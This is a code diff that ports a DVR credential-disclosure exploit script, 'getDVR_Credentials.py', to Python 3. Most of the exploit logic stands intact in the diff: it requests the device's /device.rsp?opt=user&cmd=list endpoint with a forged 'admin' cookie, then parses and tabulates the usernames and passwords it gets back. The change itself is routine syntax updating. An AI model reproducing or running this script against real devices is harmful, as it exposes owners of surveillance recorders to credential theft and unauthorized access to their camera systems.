@@ -1,4 +1,5 @@
-# -*- coding: utf-8 -*- 
+# -*- coding: utf-8 -*-
+from __future__ import print_function
 import json
 import requests
 import argparse
@@ -33,11 +34,11 @@ details = '''
  # Exploit Title:   DVRs; Credentials Exposed
  # Date:            09/04/2018
  # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
+ # version: 1.2
 '''
 parser = argparse.ArgumentParser(prog='getDVR_Credentials.py',
                                 description=' [+] Obtaining Exposed credentials', 
-                                epilog='[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81',
-                                version="1.1")
+                                epilog='[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81')
 
 parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
 parser.add_argument('--port',   dest="PORT",    help='Port',    default=80)
@@ -52,8 +53,7 @@ headers = {}
 fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
 host        =   "http://"+HST+":"+str(port)+"/"
 
-print Colors.GREEN+banner+Colors.DEFAULT
-
+print(Colors.GREEN+banner+Colors.DEFAULT)
 
 def makeReqHeaders(xCookie):
     headers["Host"]             =  host
@@ -68,26 +68,26 @@ def makeReqHeaders(xCookie):
 
 try:
     rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
-except Exception,e:
-    print Colors.RED+" [+] Timed out\n"+Colors.DEFAULT
+except Exception as e:
+    #print(e)
+    print(Colors.RED+" [+] Timed out\n"+Colors.DEFAULT)
     exit()
 
 badJson = rX.text
 try:
     dataJson = json.loads(badJson)
-    totUsr = len(dataJson["list"])   #--> 10
-except Exception, e:
-    print " [+] Error: "+str(e)
-    print " [>] json: "+str(rX)
-#    print " [>] Reuest: \n"+str(makeReqHeaders(xCookie="admin"))
+    totUsr = len(dataJson["list"])
+except Exception as e:
+    print(" [+] Error: "+str(e))
+    print(" [>] json: "+str(rX))
     exit()
 
 
-print Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(host)+Colors.GREEN
-print " [+] Port: \t\t"+Colors.ORANGE+str(port)+Colors.DEFAULT
+print(Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(host)+Colors.GREEN)
+print(" [+] Port: \t\t"+Colors.ORANGE+str(port)+Colors.DEFAULT)
 
-print Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT
-print " "
+print(Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT)
+print(" ")
 
 final_data = []
 try:
@@ -113,9 +113,12 @@ try:
 
     tp.table(final_data, cabeceras, width=20)
 
-except Exception, e:
-    print "\n [!]: "+str(e)
-    print " [+] "+ str(dataJson)
+except Exception as e:
+    print(" [!]: "+str(e))
+    print(" [+] "+ str(dataJson))
 
-print "\n"
+print(" ")
 
+thanks = '''
+[*] https://github.com/cclauss --> Accepted suggestion: compatibility with python 3 
+'''
